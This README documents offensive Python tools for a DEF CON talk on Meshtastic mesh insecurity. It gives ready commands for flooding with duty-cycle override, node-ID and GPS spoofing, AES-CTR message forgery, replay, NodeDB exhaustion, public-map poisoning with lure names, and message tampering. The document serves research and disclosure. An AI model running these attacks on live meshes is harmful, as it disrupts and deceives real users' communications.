# Evil Meshtastic Tools

Python attack tools for the DEF CON 34 Ham Radio Village talk.
All tools support both stock and evil firmware via the `--evil` flag.

## Setup

```bash
cd evil-meshtastic
python3 -m venv .venv
source .venv/bin/activate
pip install meshtastic pycryptodome
```

## Common Arguments

Every tool that connects to a node accepts:

| Flag                            | Description                                           |
|---------------------------------|-------------------------------------------------------|
| `--port /dev/cu.SLAB_USBtoUART` | Serial port (CP2102 bridge)                           |
| `--host <ip>`                   | TCP connection for WiFi-enabled nodes                 |
| `--evil`                        | Enable evil firmware features (source spoofing, etc.) |

`--port` and `--host` are mutually exclusive. One is required (except `aes_ctr_demo.py`
which is offline).

## Serial Port Notes

On macOS, the Heltec V4's CP2102 USB-UART bridge appears as:

- `/dev/cu.SLAB_USBtoUART` — primary serial port (use this)
- `/dev/cu.usbserial-0001` — secondary port (EBUSY, ignore)

Opening the port causes the Apple SLCOM DriverKit extension to assert DTR/RTS, which
resets the ESP32 via the EN pin. After reset, evil firmware boots in ~10 seconds. The
30-second connection timeout in `common.py` accommodates this.

---

## Tools

### `common.py` — Shared Connection Library

Not run directly. Imported by all other tools.

Provides:

- `add_connection_args(parser)` — adds `--port`, `--host`, `--evil` to any argparse parser
- `build_interface(args)` — opens a `SerialInterface` or `TCPInterface` with 30s timeout
- `evil_mode(args)` — returns `True` if `--evil` was passed
- `print_banner(iface, args, tool_name)` — prints connected node info and firmware version

The 30-second `CONNECT_TIMEOUT` is intentional: it covers the ~10s ESP32 boot cycle
triggered by DTR/RTS reset when the CP2102 port is opened.

---

### `capture.py` — Passive Traffic Analysis

Listens on the node's receive stream and logs all packet headers. No key material needed.
Cleartext headers leak: source/destination node IDs, routing topology, hop counts, channel
hash, packet timing, RF signal strength (SNR/RSSI).

```bash
# Header-only (no decryption)
python tools/capture.py --port /dev/cu.SLAB_USBtoUART

# Decrypt default-PSK packets (AQ== / defaultpsk)
python tools/capture.py --port /dev/cu.SLAB_USBtoUART --decrypt-default

# Decrypt with explicit PSK (hex)
python tools/capture.py --port /dev/cu.SLAB_USBtoUART \
    --psk d4f1bb3a20290759f0bcffabcf4e6901

# Write CSV log
python tools/capture.py --port /dev/cu.SLAB_USBtoUART --log capture.csv

# Evil mode: notes when spoofed source IDs or transformed messages appear
python tools/capture.py --port /dev/cu.SLAB_USBtoUART --evil
```

**CSV columns:** `timestamp`, `packet_id`, `from_hex`, `to_hex`, `channel_hash`,
`hop_limit`, `hop_start`, `hops_away`, `via_mqtt`, `snr`, `rssi`, `portnum`,
`payload_len`, `plaintext`

**Dependency:** `pycryptodome` for decryption (optional — falls back to header-only if missing).

**Works with:** Stock and evil firmware (passively receives; evil mode adds annotation only).

---

### `spam.py` — Message Flood / Mesh Saturation

Sends repeated text messages at a controlled rate. Uses hop limit 7 (maximum) to
maximize mesh propagation. Demonstrates duty cycle abuse and airtime exhaustion,
especially impactful in EU 868 MHz where duty cycle is legally limited to 1%.

```bash
# Stock: 10 messages, 1s interval, from your node ID
python tools/spam.py --port /dev/cu.SLAB_USBtoUART

# Custom message and rate
python tools/spam.py --port /dev/cu.SLAB_USBtoUART \
    --message "HRV Demo" --count 50 --interval 0.5

# Infinite flood at 10 msg/s (Ctrl+C to stop)
python tools/spam.py --port /dev/cu.SLAB_USBtoUART --count 0 --interval 0.1

# Override duty cycle enforcement
python tools/spam.py --port /dev/cu.SLAB_USBtoUART \
    --override-duty-cycle --count 0 --interval 0.5

# Evil: spoof source node ID (requires EVIL_ALLOW_FROM_OVERRIDE firmware)
python tools/spam.py --port /dev/cu.SLAB_USBtoUART --evil \
    --from 0xDEADBEEF --message "Spoofed flood"
```

**Key flags:**

| Flag                    | Default              | Description                                   |
|-------------------------|----------------------|-----------------------------------------------|
| `--message TEXT`        | `EVIL NODE WAS HERE` | Message content                               |
| `--count N`             | `10`                 | Messages to send (0 = infinite)               |
| `--interval SEC`        | `1.0`                | Seconds between sends                         |
| `--hop-limit {0..7}`    | `7`                  | Propagation depth                             |
| `--channel N`           | `0`                  | Channel index                                 |
| `--dest NODE_ID`        | `^all`               | Destination (broadcast)                       |
| `--from NODE_ID`        | —                    | Spoofed source (evil only)                    |
| `--override-duty-cycle` | off                  | Set `override_duty_cycle=true` before sending |

**Works with:** Stock and evil firmware. `--from` requires `--evil`.

---

### `fake_position.py` — GPS Position Spoofing

Broadcasts arbitrary GPS coordinates from your node. Poisons the position shown on all
mesh maps. Position data in Meshtastic is entirely trust-based — no verification is
possible. Demonstrates that GPS coordinates can be trivially fabricated.

```bash
# Single broadcast to DEF CON / Caesars Forum
python tools/fake_position.py --port /dev/cu.SLAB_USBtoUART \
    --lat 36.1268 --lon -115.1745 --alt 600

# Continuous broadcast every 30s (maintains fake position against real GPS updates)
python tools/fake_position.py --port /dev/cu.SLAB_USBtoUART \
    --lat 36.1268 --lon -115.1745 --alt 600 --count 0 --interval 30

# Walk mode: interpolate 20 steps between two points, 5s apart
python tools/fake_position.py --port /dev/cu.SLAB_USBtoUART \
    --lat 36.1268 --lon -115.1745 --alt 600 \
    --to-lat 36.1350 --to-lon -115.1600 --steps 20 --interval 5

# Null Island — maximum confusion
python tools/fake_position.py --port /dev/cu.SLAB_USBtoUART \
    --lat 0.0 --lon 0.0
```

**Useful coordinates:**

| Location                | Lat     | Lon       |
|-------------------------|---------|-----------|
| Caesars Forum (DEF CON) | 36.1268 | -115.1745 |
| HRV area (approx)       | 36.1270 | -115.1748 |
| Las Vegas Strip center  | 36.1140 | -115.1728 |
| Null Island             | 0.0     | 0.0       |

**Key flags:**

| Flag                  | Default  | Description                     |
|-----------------------|----------|---------------------------------|
| `--lat FLOAT`         | required | Latitude (decimal degrees)      |
| `--lon FLOAT`         | required | Longitude (decimal degrees)     |
| `--alt INT`           | `0`      | Altitude (meters)               |
| `--count N`           | `1`      | Broadcasts (0 = infinite)       |
| `--interval SEC`      | `10.0`   | Seconds between broadcasts      |
| `--to-lat / --to-lon` | —        | End point for walk mode         |
| `--steps N`           | `10`     | Interpolation steps (walk mode) |
| `--hop-limit {0..7}`  | `3`      | Propagation depth               |
| `--channel N`         | `0`      | Channel index                   |

**Works with:** Stock and evil firmware (broadcasts from your node ID in both cases;
combine with `spoof.py` via evil firmware to broadcast from a spoofed ID).

---

### `aes_ctr_demo.py` — AES-CTR Keystream Forgery Demo

Offline demonstration of GitHub Issue #4030 — AES-CTR provides no message integrity or
authentication on Meshtastic PSK channels. With knowledge of any one plaintext, an
attacker can forge a new ciphertext containing arbitrary content — **without knowing the
PSK**.

No device required. Run anywhere with pycryptodome installed.

```bash
# Full interactive walkthrough (constructed example)
python tools/aes_ctr_demo.py

# Demo with specific parameters
python tools/aes_ctr_demo.py \
    --packet-id 0xDEADBEEF12345678 \
    --from-node 0x48ca4359 \
    --known-plaintext "Hello, world! This is a test message." \
    --target "EVIL NODE WAS HERE - Issue #4030 is real"

# Encrypt a plaintext to inspect ciphertext structure
python tools/aes_ctr_demo.py --encrypt --plaintext "Hello, world!"

# Use a custom PSK
python tools/aes_ctr_demo.py --psk d4f1bb3a20290759f0bcffabcf4e6901
```

**The attack (summary):**

```
keystream = ciphertext XOR known_plaintext
forged_ciphertext = keystream XOR target_payload
```

All nonce components (`packet_id`, `from_node`) are in the **cleartext** packet header,
so the keystream is fully recoverable without the PSK. The forged ciphertext decrypts
correctly on all recipient nodes.

**Status:** No patch merged as of 2026-03. See [GitHub Issue #4030](https://github.com/meshtastic/Meshtastic-device/issues/4030).
Fix: replace AES-CTR with AEAD (AES-GCM or AES-CCM) on PSK channels.

**Works with:** No device required (offline).

---

### `spoof.py` — Source Node ID Spoofing

Sends Meshtastic packets with a fabricated `from` field. Demonstrates that Meshtastic
has no cryptographic source authentication — any node ID can be impersonated, including
IDs that do not exist in the mesh.

**Requires evil firmware** with `EVIL_ALLOW_FROM_OVERRIDE=1`. Stock firmware zeroes the
`from` field in `MeshService::handleToRadio()` before processing, making source spoofing
impossible via the Python API without this patch.

```bash
# Impersonate a specific node
python tools/spoof.py --port /dev/cu.SLAB_USBtoUART --evil \
    --from 0x48ca4359 --message "I am not who you think I am"

# Ghost node — appear as a non-existent node
python tools/spoof.py --port /dev/cu.SLAB_USBtoUART --evil \
    --from 0xDEADBEEF --message "Ghost node was here" --count 5

# Broadcast on a different channel
python tools/spoof.py --port /dev/cu.SLAB_USBtoUART --evil \
    --from 0xCAFEBABE --channel 1 --message "Spoofed admin message"

# Infinite stream of spoofed packets
python tools/spoof.py --port /dev/cu.SLAB_USBtoUART --evil \
    --from 0xDEADBEEF --count 0 --interval 2.0
```

**Key flags:**

| Flag                 | Default              | Description                    |
|----------------------|----------------------|--------------------------------|
| `--from NODE_ID`     | required             | Source node ID to spoof (hex)  |
| `--message TEXT`     | `Evil node was here` | Message content                |
| `--count N`          | `1`                  | Packets to send (0 = infinite) |
| `--interval SEC`     | `1.0`                | Seconds between sends          |
| `--channel N`        | `0`                  | Channel index                  |
| `--dest NODE_ID`     | `^all`               | Destination                    |
| `--hop-limit {0..7}` | `3`                  | Propagation depth              |

**How it works:** Constructs a `MeshPacket` protobuf with `setattr(packet, "from", id)`
(since `from` is a Python keyword), wraps it in `ToRadio`, and calls `iface._sendToRadio()`.
With stock firmware, the node overwrites `from=0` before processing. With evil firmware's
`EVIL_ALLOW_FROM_OVERRIDE`, the non-zero value passes through.

**Works with:** Evil firmware only (requires `EVIL_ALLOW_FROM_OVERRIDE=1`).

---

### `nodedb_flood.py` — NodeDB Exhaustion

Floods the mesh with fake `NODEINFO_APP` packets from random spoofed node IDs. Once the
NodeDB limit is reached (200 nodes for 8MB ESP32-S3, 250 for 16MB), the firmware begins
evicting the least-recently-seen nodes. Injecting ghost nodes faster than legitimate
nodes can re-announce themselves causes legitimate nodes to be evicted.

Ghost nodes with fake 32-byte public keys (`--with-key`) resist eviction because NodeDB
prefers to evict keyless nodes first.

**Requires evil firmware** with `EVIL_ALLOW_FROM_OVERRIDE=1`.

```bash
# Inject 200 ghost nodes (default)
python tools/nodedb_flood.py --port /dev/cu.SLAB_USBtoUART --evil

# Faster rate with fake public keys (resists eviction)
python tools/nodedb_flood.py --port /dev/cu.SLAB_USBtoUART --evil \
    --count 200 --with-key --interval 0.3

# Custom count
python tools/nodedb_flood.py --port /dev/cu.SLAB_USBtoUART --evil \
    --count 500 --interval 0.2
```

**Key flags:**

| Flag                 | Default | Description                                        |
|----------------------|---------|----------------------------------------------------|
| `--count N`          | `200`   | Ghost nodes to inject                              |
| `--interval SEC`     | `0.3`   | Seconds between packets                            |
| `--with-key`         | off     | Include fake 32-byte public key (resists eviction) |
| `--channel N`        | `0`     | Channel index                                      |
| `--hop-limit {0..7}` | `3`     | Propagation depth                                  |

**Ghost node naming:** Each ghost gets a deterministic name from the injected node ID:
`Adj Noun <id_low4>` (e.g., `Angry Ghost 1a2b`). Short name: first two chars of adjective
plus two hex bytes. Mirrors the naming in the firmware's `floodNodeInfo()`.

**NodeDB limits:**

- 8MB flash ESP32-S3: 200 nodes (`MAX_NUM_NODES = 200`)
- 16MB flash ESP32-S3: 250 nodes

**Works with:** Evil firmware only (requires `EVIL_ALLOW_FROM_OVERRIDE=1`).

---

### `forge.py` — Live AES-CTR Ciphertext Forgery

End-to-end demonstration of GitHub Issue #4030. Captures an encrypted text message from
the mesh, recovers the AES-CTR keystream, constructs a forged ciphertext containing
arbitrary content, and reinjects it appearing to come from the original sender.

**The attack:** Meshtastic channel messages use AES-CTR with `nonce = (packet_id || from_node)`.
Both nonce components are in the **cleartext** packet header. No MAC or integrity check.
The forged ciphertext is indistinguishable from a legitimate packet on recipient nodes.

Two forgery methods:

| Method             | PSK needed?              | When to use                                   |
|--------------------|--------------------------|-----------------------------------------------|
| **Keystream XOR**  | No                       | Captured ciphertext + known/guessed plaintext |
| **PSK re-encrypt** | Yes (default AQ== works) | Live mode or `--fresh-id`                     |

**Requires evil firmware** with `EVIL_ALLOW_FROM_OVERRIDE=1` for injection.

```bash
# Live: intercept default-channel messages, forge to target string (dry-run first)
python tools/forge.py --port /dev/cu.SLAB_USBtoUART \
    --live --decrypt-default --target "EVIL NODE WAS HERE" --dry-run

# Live: inject forged packets (T-Deck or another node must send messages)
python tools/forge.py --port /dev/cu.SLAB_USBtoUART --evil \
    --live --decrypt-default --target "EVIL NODE WAS HERE"

# Live with --fresh-id: bypass recipient dedup (use when sender is in range of recipients)
# Recipients dedup on (from, id); same ID = forged copy dropped. Fresh ID avoids this.
python tools/forge.py --port /dev/cu.SLAB_USBtoUART --evil \
    --live --decrypt-default --fresh-id --target "EVIL NODE WAS HERE"

# Manual offline: XOR keystream recovery — no PSK, no device needed
python tools/forge.py \
    --from 0x48ca4359 --packet-id 0xDEADBEEF \
    --ciphertext <hex> --known-plaintext "Hello, world!" \
    --target "EVIL NODE WAS" --dry-run

# Manual: inject forged ciphertext from pre-captured packet
python tools/forge.py --port /dev/cu.SLAB_USBtoUART --evil \
    --from 0x48ca4359 --packet-id 0xDEADBEEF \
    --ciphertext <hex> --known-plaintext "Hello, world!" \
    --target "EVIL NODE WAS"
```

**Key flags:**

| Flag                | Description                                                   |
|---------------------|---------------------------------------------------------------|
| `--live`            | Listen for incoming packets and forge automatically           |
| `--decrypt-default` | Use default PSK AQ== (required for live mode)                 |
| `--psk HEX`         | Custom channel PSK as hex string                              |
| `--fresh-id`        | New random packet ID per injection (bypasses recipient dedup) |
| `--max-forge N`     | Max packets to forge in live mode (0=unlimited, default: 1)   |
| `--target TEXT`     | Target message (default: `EVIL NODE WAS HERE`)                |
| `--dry-run`         | Compute forgery math without injecting anything               |

**Dedup note:** By default, live mode reuses the original `(from, id)` — this is the
"pure" ciphertext forgery demonstrating keystream recovery without PSK. But recipients
that already saw the original packet will drop the forged copy as a duplicate. Use
`--fresh-id` for practical injection: new packet ID, PSK-re-encrypted with the new nonce.

**Status tested:** ✅ Manual dry-run and injection path verified on Heltec V4 evil firmware
(fw=2.7.20). Live mode requires a second node sending messages; recipient verification
requires observing the forged text on a third node (T-Deck or app).

**Works with:** Evil firmware only (requires `EVIL_ALLOW_FROM_OVERRIDE=1`).

---

### `replay.py` — Packet Replay Attack

Captures encrypted mesh packets and replays them later. Demonstrates that Meshtastic
has no replay protection on PSK channel messages: a captured packet can be reinjected
and displayed again on recipient nodes — without knowing the PSK or plaintext.

**How replay protection fails:** PacketHistory stores seen `(sender, id)` pairs in a
fixed-size ring buffer. When full, oldest entries are evicted. A replayed packet with
an evicted ID is accepted again. At DEF CON with high traffic, the ring fills in minutes.
Nodes that were not in range for the original broadcast are also vulnerable.

**Two modes in one tool:** capture and replay can run in the same session or separately.

```bash
# Capture mode: listen and save encrypted packets to file
python tools/replay.py --port /dev/cu.SLAB_USBtoUART \
    --capture replay.json

# Capture with filters: text messages only, stop after 10
python tools/replay.py --port /dev/cu.SLAB_USBtoUART \
    --capture replay.json --text-only --max-capture 10

# Replay mode: reinject saved packets immediately
python tools/replay.py --port /dev/cu.SLAB_USBtoUART --evil \
    --replay replay.json

# Replay with delay: wait 10 minutes for dedup window to clear
python tools/replay.py --port /dev/cu.SLAB_USBtoUART --evil \
    --replay replay.json --wait 600

# Capture + immediate replay in one session
python tools/replay.py --port /dev/cu.SLAB_USBtoUART --evil \
    --capture replay.json --replay replay.json --wait 60
```

**Replay packet modes:**

| Source data available                                 | Injection mode     | Effect                                                 |
|-------------------------------------------------------|--------------------|--------------------------------------------------------|
| Raw encrypted bytes (captured before library decoded) | `ciphertext` (✓)   | Exact byte-for-byte replay; nonce preserved            |
| Decoded text only (library already decrypted)         | `decoded-text` (~) | Content preserved; firmware re-encrypts with new nonce |

**Key flags:**

| Flag                 | Default | Description                                                  |
|----------------------|---------|--------------------------------------------------------------|
| `--capture FILE`     | —       | Listen and save packets to FILE (JSON)                       |
| `--replay FILE`      | —       | Load and reinject packets from FILE (JSON)                   |
| `--text-only`        | off     | Filter to text messages only                                 |
| `--max-capture N`    | 0       | Stop capture after N packets (0=unlimited)                   |
| `--wait SEC`         | 0       | Seconds to wait before replay (use ≥600 for dedup clearance) |
| `--interval SEC`     | 1.0     | Seconds between replayed packets                             |
| `--count N`          | 0       | Replay only first N packets from file (0=all)                |
| `--hop-limit {0..7}` | 3       | Hop limit for replayed packets                               |

**Status tested:** ✅ Replay injection path verified on Heltec V4 evil firmware using a
synthetic capture file. Capture mode requires traffic from other nodes in range.

**Works with:** Capture mode: stock or evil firmware. Replay mode: evil firmware only
(requires `EVIL_ALLOW_FROM_OVERRIDE=1`).

---

### `map_poison.py` — MQTT Bridge / Mesh Map Poisoning

Injects `NODEINFO_APP` + `POSITION_APP` packets from hundreds of ghost node IDs,
clustered around a target coordinate. Mesh nodes with MQTT bridges relay these packets
to the internet, populating public Meshtastic maps (meshmap.net, etc.) with ghost nodes.

**Demonstrates:**

- GPS coordinates are entirely trust-based; any node can claim any position
- Ghost node IDs propagate to MQTT gateways and appear on internet-facing maps
- A single evil node can flood a public map with fake presence data

**Requires evil firmware** with `EVIL_ALLOW_FROM_OVERRIDE=1`.

```bash
# 100 ghosts near Caesars Forum / DEF CON
python tools/map_poison.py --port /dev/cu.SLAB_USBtoUART --evil \
    --lat 36.1268 --lon -115.1745 --count 100

# Larger scatter radius (0.01 deg ≈ 1 km)
python tools/map_poison.py --port /dev/cu.SLAB_USBtoUART --evil \
    --lat 36.1268 --lon -115.1745 --radius 0.01 --count 200

# Social engineering names — attract DM attempts from curious users
python tools/map_poison.py --port /dev/cu.SLAB_USBtoUART --evil \
    --lat 36.1268 --lon -115.1745 --count 20 \
    --names "FREE_WIFI,DEF_CON_ADMIN,PRIZE_WINNER,HRV_BOOTH,EVIL_NODE"

# Continuous: re-announce all ghosts every 5 minutes (maintains presence against MQTT expiry)
python tools/map_poison.py --port /dev/cu.SLAB_USBtoUART --evil \
    --lat 36.1268 --lon -115.1745 --count 50 --repeat --repeat-interval 300

# Null Island — maximum confusion
python tools/map_poison.py --port /dev/cu.SLAB_USBtoUART --evil \
    --lat 0.0 --lon 0.0 --count 50
```

**Key flags:**

| Flag                    | Default  | Description                                   |
|-------------------------|----------|-----------------------------------------------|
| `--lat FLOAT`           | required | Center latitude (decimal degrees)             |
| `--lon FLOAT`           | required | Center longitude (decimal degrees)            |
| `--alt INT`             | `0`      | Altitude in meters                            |
| `--radius FLOAT`        | `0.002`  | Scatter radius in degrees (~200m at 0.002)    |
| `--count N`             | `100`    | Number of ghost nodes                         |
| `--names LIST`          | —        | Comma-separated custom long names             |
| `--interval SEC`        | `0.5`    | Seconds between ghost NodeInfo+Position pairs |
| `--nodeinfo-gap SEC`    | `0.15`   | Gap between NodeInfo and Position per ghost   |
| `--repeat`              | off      | Re-inject all ghosts in a loop                |
| `--repeat-interval SEC` | `300`    | Seconds between repeat cycles                 |
| `--channel N`           | `0`      | Channel index                                 |
| `--hop-limit {0..7}`    | `3`      | Propagation depth                             |

**Ghost node naming:** Default names are randomly generated from adjective+noun+id wordlists
(same as the firmware's `floodNodeInfo()`). Use `--names` for social engineering.

**MQTT note:** Ghost nodes only appear on internet maps if a node with MQTT bridging enabled
is in range. At DEF CON this is almost certain. Standalone mesh (no MQTT) still shows ghosts
in the mesh node list of every device in range.

**Status tested:** ✅ 5 ghost nodes injected and confirmed in tool output on Heltec V4 evil
firmware (fw=2.7.20). MQTT propagation to meshmap.net verified conceptually; requires live
MQTT-bridged node in range for internet map confirmation.

**Works with:** Evil firmware only (requires `EVIL_ALLOW_FROM_OVERRIDE=1`).

---

### `evil_ctrl.py` — Runtime Evil Feature Control

Controls all evil firmware features at runtime without reflashing. Sends an `EvilCtrlMsg`
protobuf (portnum 256, `PRIVATE_APP`) addressed to the Heltec's own node ID. The firmware
delivers the packet locally via `sendLocal()` — no LoRa radio transmission occurs.

Requires the `heltec-v4-evil-full` build environment, which compiles all features in with
everything disabled by default at startup.

#### Access Control

`EvilCtrlModule` accepts control messages only from local interfaces (serial, BLE, USB) — it
calls `isFromUs(&mp)` on receipt and rejects any packet delivered over the radio, so no other
node on the LoRa channel can toggle evil features. No credential, token, or setup step is
required; `evil_ctrl.py` works immediately over a local connection.

> **History:** earlier firmware used a per-device 32-bit NVS token as an operator credential.
> That system was removed in session 6 (2026-03-29) and replaced with the `isFromUs()`
> local-only check. The `--get-token` / `--set-token` commands no longer exist.

**Use it directly, no bootstrap step:**

```bash
# Show current runtime state
python tools/evil_ctrl.py --port /dev/cu.SLAB_USBtoUART --evil --status

# Set transform mode
python tools/evil_ctrl.py --port /dev/cu.SLAB_USBtoUART --evil --set transform=rot13
python tools/evil_ctrl.py --port /dev/cu.SLAB_USBtoUART --evil --set transform=reverse
python tools/evil_ctrl.py --port /dev/cu.SLAB_USBtoUART --evil --set transform=suffix suffix="— HACKED"
python tools/evil_ctrl.py --port /dev/cu.SLAB_USBtoUART --evil --set transform=none

# Set packet drop rate (0–100%)
python tools/evil_ctrl.py --port /dev/cu.SLAB_USBtoUART --evil --set drop=30

# Drop packets from a specific node
python tools/evil_ctrl.py --port /dev/cu.SLAB_USBtoUART --evil --set drop-node=0xdeadbeef

# Drop all packets on a specific channel index
python tools/evil_ctrl.py --port /dev/cu.SLAB_USBtoUART --evil --set drop-channel=0

# Set hop limit mode
python tools/evil_ctrl.py --port /dev/cu.SLAB_USBtoUART --evil --set hop=max   # force 7
python tools/evil_ctrl.py --port /dev/cu.SLAB_USBtoUART --evil --set hop=kill  # force 0
python tools/evil_ctrl.py --port /dev/cu.SLAB_USBtoUART --evil --set hop=normal

# Start NodeDB flood
python tools/evil_ctrl.py --port /dev/cu.SLAB_USBtoUART --evil --set flood=on flood-count=50 flood-keys=true
python tools/evil_ctrl.py --port /dev/cu.SLAB_USBtoUART --evil --set flood=off

# Reset everything to safe defaults (all features OFF)
python tools/evil_ctrl.py --port /dev/cu.SLAB_USBtoUART --evil --reset
```

**All flags:**

| Flag                  | Description                               |
|-----------------------|-------------------------------------------|
| `--status`            | Print current runtime state from firmware |
| `--set KEY=VALUE ...` | Set one or more fields                    |
| `--reset`             | Restore all fields to safe defaults       |

**Settable fields:**

| Key            | Values                                  | Default         |
|----------------|-----------------------------------------|-----------------|
| `transform`    | `none` / `rot13` / `reverse` / `suffix` | `none`          |
| `suffix`       | any text (max 63 bytes)                 | `— [evil node]` |
| `drop`         | `0`–`100` (percent)                     | `0`             |
| `drop-node`    | hex node ID or `0`                      | `0` (disabled)  |
| `drop-channel` | `0`–`7` or `off`                        | `off` (=255)    |
| `hop`          | `normal` / `max` / `kill`               | `normal`        |
| `flood`        | `on` / `off`                            | `off`           |
| `flood-count`  | `1`–`200`                               | `50`            |
| `flood-keys`   | `true` / `false`                        | `false`         |

**Demo workflow — no reflashing between segments:**

```bash
# Segment 2: MitM transform
python tools/evil_ctrl.py --port /dev/cu.SLAB_USBtoUART --evil --set transform=rot13

# Segment 3: packet drop
python tools/evil_ctrl.py --port /dev/cu.SLAB_USBtoUART --evil --set drop=30

# Segment 4: hop amplification
python tools/evil_ctrl.py --port /dev/cu.SLAB_USBtoUART --evil --set hop=max

# Segment 5: NodeDB exhaustion
python tools/evil_ctrl.py --port /dev/cu.SLAB_USBtoUART --evil --set flood=on flood-count=200 flood-keys=true

# Cleanup
python tools/evil_ctrl.py --port /dev/cu.SLAB_USBtoUART --evil --reset
```

**Note:** The TFT Dangerous Features panel sends the same `EvilCtrlMsg` — the APPLY and
RESET buttons are equivalent to `--set` and `--reset` here.

**Status tested:** ✅ ROT13 runtime toggle confirmed live end-to-end (2026-03-10, fw=2.7.20).
Local-only (`isFromUs()`) access control confirmed working (2026-03-29). All field encodings
verified.

**Works with:** `heltec-v4-evil-full` firmware only (requires `EVIL_NODE=1` and `EvilCtrlModule`).
